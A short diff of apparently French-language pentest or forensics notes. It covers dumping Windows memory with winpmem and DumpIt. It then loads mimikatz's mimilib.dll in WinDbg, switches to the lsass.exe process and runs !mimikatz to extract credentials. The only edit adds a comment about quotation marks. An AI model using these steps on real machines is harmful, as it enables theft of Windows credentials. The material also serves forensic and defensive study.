@@ -453,7 +453,7 @@ ou winpmem_mini_x64_rc2.exe mondump.mem + copy mondump.mem Z:mondmp.mem
 ou DumpIt.exe /OUTPUT z:mondump.dmp /QUIET
 
 windgb + memory.dmp
-0:kd>.load C:\Users\XXX\Downloads\mimikatz_trunk\x64\mimilib.dll
+0:kd>.load C:\Users\XXX\Downloads\mimikatz_trunk\x64\mimilib.dll ### Attention : sans les guillements
 0:kd>!process 0 0 lsass.exe
 0:kd>.process /r /p ffff9a8c884130c0(PROCESS)
 0:kd>!mimikatz
